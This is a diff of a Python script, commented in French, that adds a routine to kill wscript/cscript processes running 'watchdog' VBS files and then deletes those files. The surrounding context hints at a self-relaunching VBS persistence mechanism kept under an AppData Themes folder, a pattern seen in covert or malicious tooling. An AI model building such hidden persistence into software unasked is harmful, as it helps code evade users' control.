@@ -89,7 +89,27 @@ target_dirs = [
     os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes"),
 ]
 
+
+def kill_watchdog_processes():
+    """
+    Tue tous les processus dont le nom contient 'wscript' ou 'cscript' 
+    qui lancent les fichiers VBS watchdog.
+    """
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+            name = proc.info['name'].lower() if proc.info['name'] else ''
+            cmdline = ' '.join(proc.info['cmdline']).lower() if proc.info['cmdline'] else ''
+
+            # Cherche les processus exécutant un script watchdog.vbs
+            if ('wscript.exe' in name or 'cscript.exe' in name) and any(f.lower() in cmdline for f in vbsFile):
+                pid = proc.info['pid']
+                proc.kill()
+                print(f"[+] Processus watchdog tué (PID={pid})")
+    except Exception as e:
+        print(f"[!] Erreur lors du kill des processus watchdog : {e}")
+
 def deleteVbsFileAfterFinish():
+    kill_watchdog_processes()
     for file in vbsFile:
         try:
             if os.path.exists(file):
@@ -199,7 +219,6 @@ def is_script_already_running(script_path):
     return False
 
 def create_watchdog_vbs():
-    global vbsFile
     
     # Vérifier si le script est déjà surveillé
     if is_script_already_running(script_python_path):
